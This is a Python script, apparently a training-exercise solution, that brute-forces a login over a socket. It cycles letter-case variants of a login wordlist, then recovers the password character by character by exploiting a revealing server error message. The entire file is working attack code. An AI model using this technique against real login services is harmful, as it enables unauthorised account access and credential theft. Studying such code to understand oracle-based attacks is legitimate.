import socket
import sys
import string
import itertools
import os
import json


def try_password(login):
    request = {"login": login, "password": ""}
    password = ""
    while True:
        for data in possibilities:
            request["password"] = password + "".join(data)
            data_send = json.dumps(request).encode()
            client_socket.send(data_send)
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == "Exception happened during login":
                password = request["password"]
                break
            if response["result"] == "Connection success!":
                print(json.dumps(request))
                return


# Trying to find the login
def upper_and_lower(word):
    request = {"login": "", "password": "123456"}

    possibility = "".join(['0' for x in range(len(word))])
    total_possibility = "".join(['1' for x in range(len(word))])
    while int(possibility, 2) <= int(total_possibility, 2):
        one_try = "".join([l if possibility[i] == '0' or l.isdigit() else l.upper() for i, l in enumerate(word)])
        possibility = str(bin(int(possibility, 2) + 1))[2:]
        possibility = "".join(['0' for x in range(len(word) - len(possibility))]) + possibility
        request["login"] = one_try
        data_send = json.dumps(request).encode()
        client_socket.send(data_send)
        response = json.loads(client_socket.recv(1024).decode())
        if response["result"] == "Wrong password!":
            return one_try
    return False


# creating the socket
client_socket = socket.socket()
hostname = sys.argv[1]
port = int(sys.argv[2])
address = (hostname, port)

# connecting to the server
client_socket.connect(address)
possibilities = string.ascii_letters + string.digits

file = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"), "r")
login = ""
for word in file.readlines():
    login = upper_and_lower(word.strip())
    if login:
        break

try_password(login)

file.close()
client_socket.close()
